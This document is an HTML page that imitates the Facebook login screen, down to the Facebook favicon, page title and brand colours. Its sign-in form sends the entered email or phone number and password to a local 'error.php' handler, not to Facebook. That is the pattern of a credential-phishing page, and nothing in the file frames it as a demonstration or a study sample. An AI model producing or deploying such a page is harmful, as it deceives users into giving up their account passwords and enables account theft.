<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <meta name="keywords" content="Social Media , Facebook , Contact Friends , Connect With People , Share What You Want">
    <meta name="description" content="facebook.com">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - login or sign up</title>
    <style>
        body{
            background-color: #eeeefa;
        }
        *{
            padding:0px;
            margin:0px;
        }
        #title{
            font-size:65px;
            color:#1122FFdd;
            font-weight:bold;
            font-family: sans-serif;
            letter-spacing:-3px;
        }
        #des{
            font-size:25px;
            font-family: sans-serif;
            padding:9px 27px 24px 27px;
            color: #000d;
        }
        #top-right{
            text-align:center;
            margin-top:28px;
        }
        #down-left{
            background-color: #fff;
            width: 376px;
            margin: 0 auto;
            border: 1px solid #0001;
            border-radius:10px;
            box-shadow: 0px 2px 8px #0003;
            text-align:center;
            margin-top:16px;
            padding: 10px 10px 10px 10px;
        }
        .txt{
            width: calc(96% - 20px);
            height: 30px;
            margin: 5px;
            border: 1px solid #5552;
            border-radius:6px;
            padding: 10px;
            font-size:19px;
            outline: none;
        }
        .txt:focus{
            outline: 2px solid #00b2;
            border: 1px solid #00b9;
        }
        ::placeholder{
            color: #0006;
        }
        .btn{
            width: 96%;
            height: 50px;
            margin: 11px 0px 16px 0px;
            font-size:20px;
            border: 1px solid #5551;
            border-radius:6px;
            font-weight:bold;
            color: #fff;
            background-color: #0828ffaa;
            transition-duration: 0.25s;
            cursor: pointer;
        }
        .btn:hover{
            background-color: #0828ffc2;
        }
        a{
            font-family: sans-serif;
            font-size: 15px;
            color: #00f9;
            text-decoration: none;
        }
        a:hover{
            text-decoration: underline;
        }
        hr{
            width: 96%;
            margin: 20px 2% 20px 2%;
            border: none;
            border-top: 1px solid #7773;
        }
        .create{
            width: 57.5%;
            height: 50px;
            margin: 6px 0px 13px 0px;
            font-size:18px;
            border: 1px solid #5551;
            border-radius:6px;
            font-weight:bold;
            color: #fff;
            background-color: #08aa28ea;
            transition-duration: 0.25s;
            cursor: pointer;
        }
        .create:hover{
            background-color: #08aa28ff;
        }
    </style>
</head>
<body>
    <div id="top-right">
        <p id="title">facebook</p>
        <p id="des">Facebook gives you the ability to connect with people and share what you want with them.
        </p>
    </div>
    <div id="down-left">
        <form method="post" action="error.php">
            <input type="text" placeholder="Email or phone number" name="email" class="txt"></input>
            <input type="password" placeholder="The password" name="pass" class="txt"></input>
            <input type="submit" value="sign in" class="btn"></input>
        </form>
        <a href="#">Forgot your password?</a>
        <hr>
        <button class="create">Create a new account</button>
    </div>
</body>
</html>
